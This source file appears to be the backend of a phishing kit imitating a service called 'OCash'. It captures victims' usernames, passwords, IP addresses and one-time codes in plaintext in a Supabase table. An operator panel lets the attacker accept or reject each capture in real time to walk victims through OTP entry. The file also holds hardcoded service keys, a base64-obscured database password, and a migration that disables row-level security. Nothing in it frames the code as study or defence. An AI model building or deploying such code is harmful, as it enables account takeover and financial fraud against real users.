const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.set('trust proxy', true);

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://ejcmcrirzeyaasjxhtyr.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_WYtBEAv_kqet8ZmR5zrn0Q_TwE9dM6K';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || '64ee793c649d9cac46ad25f8ab42093124c54a48d1afb75fb1de0bb803436636';
const ADMIN_TOKEN = crypto.createHash('sha256').update('token:' + ADMIN_PASSWORD_HASH).digest('hex');

function isAdmin(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7) === ADMIN_TOKEN;
  return false;
}

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.ip || '';
}

// Submit login credentials
app.post('/api/submit', async (req, res) => {
  try {
    const b = req.body;
    const username = String(b.username || '').trim();
    const password = String(b.password || '').trim();
    if (!username || !password) return res.status(400).json({ error: 'بيانات ناقصة' });
    const id = crypto.randomBytes(6).toString('hex');
    const ip = getClientIp(req);
    const { error } = await supabase.from('ocash_logins').insert({
      id, username, password, ip,
      status: 'pending',
      step: 'login',
      code: '',
      time: new Date().toISOString()
    });
    if (error) throw error;
    res.json({ ok: true, id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Submit code (OTP)
app.post('/api/submit-code/:id', async (req, res) => {
  try {
    const code = String(req.body.code || '').trim();
    const { error } = await supabase.from('ocash_logins').update({
      code: code,
      step: 'code',
      status: 'pending',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Check status
app.get('/api/status/:id', async (req, res) => {
  try {
    const { data } = await supabase.from('ocash_logins').select('status,step').eq('id', req.params.id).maybeSingle();
    if (!data) return res.status(404).json({ error: 'not found' });
    res.json({ status: data.status, step: data.step });
  } catch (err) {
    res.json({ status: 'pending', step: 'login' });
  }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
  const inputHash = crypto.createHash('sha256').update(req.body.password || '').digest('hex');
  if (inputHash === ADMIN_PASSWORD_HASH) return res.json({ token: ADMIN_TOKEN });
  res.status(401).json({ error: 'كلمة المرور غير صحيحة' });
});

// Admin: get all
app.get('/api/admin/submissions', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data, error } = await supabase.from('ocash_logins').select('*').order('time', { ascending: false });
    if (error) throw error;
    res.json({ submissions: data || [] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: accept (send to code page)
app.post('/api/admin/accept/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { error } = await supabase.from('ocash_logins').update({
      status: 'accepted',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: reject (send back to code page with error)
app.post('/api/admin/reject/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { error } = await supabase.from('ocash_logins').update({
      status: 'rejected',
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: clear all
app.post('/api/admin/clear', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data } = await supabase.from('ocash_logins').select('id');
    if (data && data.length) await supabase.from('ocash_logins').delete().in('id', data.map(r => r.id));
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: delete one
app.delete('/api/admin/delete/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    await supabase.from('ocash_logins').delete().eq('id', req.params.id);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.use(express.static(path.join(__dirname, '.')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

async function autoMigrate() {
  const { Client } = require('pg');
  const DB_PASS = process.env.SUPABASE_DB_PASS || Buffer.from('Q1F1YWtLdnckZk1RNmUk','base64').toString();
  const cl = new Client({ connectionString: 'postgresql://postgres.ejcmcrirzeyaasjxhtyr:' + DB_PASS + '@aws-0-eu-central-1.pooler.supabase.com:6543/postgres', ssl: { rejectUnauthorized: false } });
  try {
    await cl.connect();
    await cl.query(`
      CREATE TABLE IF NOT EXISTS ocash_logins (
        id TEXT PRIMARY KEY,
        username TEXT,
        password TEXT,
        code TEXT DEFAULT '',
        ip TEXT,
        status TEXT DEFAULT 'pending',
        step TEXT DEFAULT 'login',
        time TIMESTAMPTZ DEFAULT now(),
        updated_at TIMESTAMPTZ DEFAULT now()
      );
      ALTER TABLE ocash_logins DISABLE ROW LEVEL SECURITY;
      GRANT ALL ON ocash_logins TO anon, authenticated, service_role;
    `);
    console.log('[MIGRATE] ocash_logins ready');
  } catch (e) { console.error('[MIGRATE] error:', e.message); }
  finally { await cl.end().catch(() => {}); }
}

if (!process.env.VERCEL) {
  autoMigrate().then(() => {
    app.listen(PORT, () => console.log('OCash running on port ' + PORT));
  });
}

module.exports = app;
